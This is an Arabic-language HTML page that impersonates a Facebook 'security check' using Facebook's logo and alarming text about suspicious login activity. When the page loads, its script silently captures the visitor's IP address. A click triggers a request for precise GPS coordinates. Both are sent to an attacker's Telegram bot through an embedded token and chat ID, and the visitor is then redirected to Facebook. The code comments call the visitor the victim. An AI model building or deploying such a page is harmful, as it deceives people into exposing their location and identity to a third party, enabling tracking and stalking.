<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta property="og:title" content="تنبيه أمني: تسجيل دخول مشبوه">
<meta property="og:description" content="تم رصد محاولة وصول لحسابك من جهاز غير معروف. اضغط للمراجعة.">
<meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">

<title>Facebook - Security Check</title>

<style>
    body { margin: 0; background: #f0f2f5; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
    .box { text-align: center; color: #65676b; }
    .btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; border: none; font-weight: bold; margin-top: 20px; }
</style>
</head>
<body onclick="getAccurateGPS()">

<div class="box">
    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" width="100">
    <h2>يرجى تأكيد هويتك</h2>
    <p>لقد لاحظنا نشاطاً غير معتاد على حسابك.</p>
    <button class="btn">تأكيد الحساب</button>
</div>

<script>
const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

// 🔱 1. صيد الـ IP الخارجي صامتاً (بدون ضغط) 🔱
// نستخدم خدمة ipify مع نظام JSONP لتجاوز حماية CORS نهائياً
function captureIPSilent() {
    const script = document.createElement('script');
    script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
    document.body.appendChild(script);
}

function handleIP(data) {
    let msg = `🚀 صيد خارجي (صامت - بدون ضغط)\n🌐 الـ IP الحقيقي: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleTimeString()}`;
    sendToTelegram(msg);
}

// 🔱 2. صيد الـ GPS الدقيق (عند الضغط) 🔱
function getAccurateGPS() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
            sendToTelegram(msg);
            setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
        }, (err) => {
            sendToTelegram("⚠️ الضحية ضغط ولكن رفض إذن الموقع");
            window.location.href = "https://m.facebook.com";
        }, { enableHighAccuracy: true });
    }
}

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
}

// التنفيذ الفوري عند تحميل الصفحة (قبل أي لمسة)
window.onload = captureIPSilent;
</script>
</body>
</html>
